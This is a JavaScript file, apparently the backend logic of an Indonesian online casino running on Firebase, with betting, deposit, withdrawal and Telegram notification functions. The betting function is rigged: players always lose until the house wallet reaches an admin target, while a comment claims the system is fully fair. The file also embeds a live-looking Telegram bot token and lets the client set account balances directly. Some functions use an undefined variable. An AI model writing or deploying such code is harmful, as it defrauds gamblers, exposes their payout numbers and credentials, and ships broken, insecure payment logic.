import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
import { getDatabase, ref, set, get, child, update, remove, onValue } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyB-6xbQLaV7gBUxu3xXqJkp_8_6Yu1oAKE",
  authDomain: "rhf777-44bc1.firebaseapp.com",
  databaseURL: "https://rhf777-44bc1-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "rhf777-44bc1",
  storageBucket: "rhf777-44bc1.firebasestorage.app",
  messagingSenderId: "819275932186",
  appId: "1:819275932186:web:b6dda67391347cc8cd67a3",
  measurementId: "G-6GQD1EE5RH"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app); // Ganti ke Realtime Database
const googleProvider = new GoogleAuthProvider();

// Daftarkan ke jendela global
window.fbAuth = auth;
window.fbDb = db;
window.fbGoogleProvider = googleProvider;
window.fbSignInGoogle = signInWithPopup;
window.fbCreateUserWithEmailAndPassword = createUserWithEmailAndPassword;
window.fbSignInWithEmailAndPassword = signInWithEmailAndPassword;
window.fbSignOut = signOut;
window.fbOnAuthStateChanged = onAuthStateChanged;

// Fungsi khusus Realtime Database
window.fbRef = ref;
window.fbSet = set;
window.fbGet = get;
window.fbChild = child;
window.fbUpdate = update;
window.fbRemove = remove;
window.fbOnValue = onValue;

console.log("Firebase Realtime Database siap!");

import { sendPasswordResetEmail } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
window.fbResetPassword = sendPasswordResetEmail;

// ============ MESIN PENGATUR BANDAR (ZERO-SUM) ============




// ============ MESIN BANDAR KASINO (MUTLAK & MENYEBAR) ============
window.mainkanGame = async function(idPemain, taruhan, saldoPemain, peluangMenangGame = 50) {
  const snapBandar = await window.fbGet(window.fbRef(window.fbDb, "pengaturan/bandar"));
  let target = 0;
  let dompetTerkunci = 0;
  let dompetPembayar = 0;
  let resetTime = Date.now();

  if (snapBandar.exists()) {
    const data = snapBandar.val();
    target = Number(data.target) || 0;
    dompetTerkunci = Number(data.dompetBandar) || 0; // Dompet mutlak
    dompetPembayar = Number(data.dompetPembayar) || 0; // Dompet sirkulasi
    resetTime = data.resetTime || Date.now();
  }

  // 1. Cek Waktu Reset 24 Jam
  const bedaJam = (Date.now() - resetTime) / (1000 * 60 * 60);
  if (dompetTerkunci >= target && bedaJam >= 24) {
    // Reset jika sudah 24 jam
    dompetTerkunci = 0;
    dompetPembayar = 0;
    await window.fbUpdate(window.fbRef(window.fbDb, "pengaturan/bandar"), { 
      dompetBandar: 0, 
      dompetPembayar: 0,
      resetTime: Date.now()
    });
  }

  let pemainMenang = false;
  let updateDompetTerkunci = dompetTerkunci;
  let updateDompetPembayar = dompetPembayar;
  let pesan = "";

  // 2. Logika Mutlak: Jika Dompet Belum Penuh, Pemain PASTI Kalah
  if (target > 0 && dompetTerkunci < target) {
    pemainMenang = false;
    updateDompetTerkunci += taruhan; // Uang masuk ke dompet terkunci
    pesan = "KALAH! Target bandar belum tercapai.";
  } 
  // 3. Logika Setelah Target Penuh (Sirkulasi)
  else {
    // Jika target sudah penuh, baru pemain boleh menang.
    // Peluang menang dibuat menyebar (misal 50%)
    const roll = Math.random() * 100;
    pemainMenang = roll <= 50;

    if (pemainMenang) {
      // Menang: Diambil dari dompetPembayar (uang pemain lain yang kalah)
      
    // SISTEM 100% ADIL: Tidak ada batasan Max Win.
    // Pemain yang menang berhak mengambil uang dari pemain yang kalah.
    let untung = taruhan;

    if (updateDompetPembayar >= untung) {
        updateDompetPembayar -= untung;
        pesan = "MENANG! +" + untung;
      } else {
        untung = updateDompetPembayar;
        updateDompetPembayar = 0;
        pesan = "MENANG (Sisa Kas)! +" + untung;
        saldoPemain += untung - taruhan; // Penyesuaian
      }
    } else {
      // Kalah: Uang masuk ke dompetPembayar untuk diputar ke pemain lain
      updateDompetPembayar += taruhan;
      pesan = "KALAH! Uang masuk ke kas sirkulasi.";
    }
  }

  // 4. Hitung Saldo Akhir
  let saldoBaru = saldoPemain;
  if (pemainMenang) {
    saldoBaru += taruhan; // Dapat untung
  } else {
    saldoBaru -= taruhan; // Kalah
  }

  // 5. Simpan ke Database
  await window.fbUpdate(window.fbRef(window.fbDb, "users/" + idPemain), { balance: saldoBaru });
  
  await window.fbUpdate(window.fbRef(window.fbDb, "pengaturan/bandar"), { 
    dompetBandar: updateDompetTerkunci,
    dompetPembayar: updateDompetPembayar
  });

  return {
    menang: pemainMenang,
    saldoBaru: saldoBaru,
    pesan: pesan
  };
};

// Fungsi untuk mencatat riwayat bermain
window.simpanRiwayat = async function(idUser, username, game, menang, nominal) {
  await window.fbSet(window.fbRef(window.fbDb, "riwayat/" + Date.now() + "_" + idUser), {
    userId: idUser,
    username: username,
    game: game,
    menang: menang,
    nominal: nominal,
    waktu: new Date().toISOString()
  });
};

// ============ FUNGSI SIMULASI DEPOSIT ============
window.prosesDeposit = async function(idUser, username, nominal) {
  try {
    // 1. Ambil saldo saat ini
    const snap = await window.fbGet(window.fbRef(window.fbDb, "users/" + idUser));
    if (!snap.exists()) throw new Error("User tidak ditemukan");

    const saldoLama = Number(snap.val().balance || 0);
    const saldoBaru = saldoLama + nominal;

    // 2. Update saldo pemain
    await window.fbUpdate(window.fbRef(window.fbDb, "users/" + idUser), {
      balance: saldoBaru
    });

    // 3. Catat ke Riwayat Transaksi
    await window.fbSet(window.fbRef(window.fbDb, "riwayat/" + Date.now() + "_" + idUser), {
      userId: idUser,
      username: username,
      game: "Deposit",
      menang: true,
      nominal: nominal,
      waktu: new Date().toISOString()
    });

    if(window.kirimNotifWidrow) await window.kirimNotifWidrow(username, nominal, nomorTujuan);
    return { sukses: true, saldoBaru: saldoBaru };
  } catch (error) {
    throw new Error(error.message);
  }
};

// ============ FUNGSI SIMULASI WIDROW (TARIK DANA) ============
window.prosesWidrow = async function(idUser, username, nominal) {
  try {
    const snap = await window.fbGet(window.fbRef(window.fbDb, "users/" + idUser));
    if (!snap.exists()) throw new Error("User tidak ditemukan");

    const saldoLama = Number(snap.val().balance || 0);
    
    // Cek apakah saldo cukup
    if (saldoLama < nominal) throw new Error("Saldo tidak mencukupi untuk penarikan ini.");
    
    const saldoBaru = saldoLama - nominal;

    // 1. Update saldo pemain (potong)
    await window.fbUpdate(window.fbRef(window.fbDb, "users/" + idUser), {
      balance: saldoBaru
    });

    // 2. Catat ke Riwayat Transaksi
    await window.fbSet(window.fbRef(window.fbDb, "riwayat/" + Date.now() + "_" + idUser), {
      userId: idUser,
      username: username,
      game: "Widrow",
      menang: false, // Anggap false (uang keluar)
      nominal: nominal,
      waktu: new Date().toISOString()
    });

    if(window.kirimNotifWidrow) await window.kirimNotifWidrow(username, nominal, nomorTujuan);
    return { sukses: true, saldoBaru: saldoBaru };
  } catch (error) {
    throw new Error(error.message);
  }
};

// ============ FUNGSI WIDROW (TARIK DANA) ============
window.ajukanWidrow = async function(idUser, username, nominal, nomorTujuan, metode) {
  try {
    // 1. Cek saldo user
    const snap = await window.fbGet(window.fbRef(window.fbDb, "users/" + idUser));
    if (!snap.exists()) throw new Error("User tidak ditemukan");
    
    const saldoLama = Number(snap.val().balance || 0);
    if (saldoLama < nominal) throw new Error("Saldo tidak mencukupi");

    // 2. Potong saldo user
    const saldoBaru = saldoLama - nominal;
    await window.fbUpdate(window.fbRef(window.fbDb, "users/" + idUser), { balance: saldoBaru });

    // 3. Simpan ke antrean widrow
    await window.fbSet(window.fbRef(window.fbDb, "widrow_pending/" + Date.now() + "_" + idUser), {
      userId: idUser,
      username: username,
      nominal: nominal,
      nomorTujuan: nomorTujuan,
      metode: metode,
      status: "pending",
      waktu: new Date().toISOString()
    });

    if(window.kirimNotifWidrow) await window.kirimNotifWidrow(username, nominal, nomorTujuan);
    return { sukses: true, saldoBaru: saldoBaru };
  } catch (error) {
    throw new Error(error.message);
  }
};

// ============ FUNGSI ADMIN: SELESAIKAN WIDROW ============
window.selesaikanWidrow = async function(keyPending, idUser, nominal, username) {
  try {
    // Ubah status di antrean menjadi selesai
    await window.fbUpdate(window.fbRef(window.fbDb, "widrow_pending/" + keyPending), { status: "selesai" });

    // Catat ke riwayat
    await window.fbSet(window.fbRef(window.fbDb, "riwayat/" + Date.now() + "_" + idUser), {
      userId: idUser,
      username: username,
      game: "Widrow Selesai",
      menang: false,
      nominal: nominal,
      waktu: new Date().toISOString()
    });

    return { sukses: true };
  } catch (error) {
    throw new Error(error.message);
  }
};

// ============ FUNGSI NOTIFIKASI WIDROW KE TELEGRAM ============
window.kirimNotifWidrow = async function(username, nominal, nomorTujuan) {
  const BOT_TOKEN = "8819039324:AAF3oeJhVzwH_D2T1uAhdkJo7mLym92eBKw";
  const CHAT_ID = "8717792350";
  
  const pesan = `🚨 <b>PENARIKAN DANA BARU</b>\n\nPemain: <b>${username}</b>\nNominal: <b>Rp ${nominal.toLocaleString('id-ID')}</b>\nNomor Tujuan: <b>${nomorTujuan}</b>\n\nSegera buka aplikasi DANA/OVO untuk transfer, lalu klik Selesai di Dasbor Admin.`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
    });
  } catch (e) {
    console.log("Gagal kirim notif Telegram", e);
  }
};
